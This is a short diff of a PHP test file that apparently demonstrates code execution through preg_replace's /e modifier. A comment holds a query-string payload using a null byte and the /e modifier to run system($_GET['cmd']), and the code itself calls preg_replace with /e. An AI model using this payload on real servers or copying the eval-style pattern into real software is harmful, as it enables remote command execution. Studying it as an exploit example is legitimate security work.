@@ -9,7 +9,7 @@ error_reporting(-1);
 
 //highlight=||/e%00&replacement=system($_GET['cmd']);&cmd=echo%20phpinfo() 
 
-blue|phpinfo()/e%00
+//blue|phpinfo()/e%00
 
 $string = preg_replace("/phpinfo\(\);/e", '$0', "phpinfo();");
 echo $string;
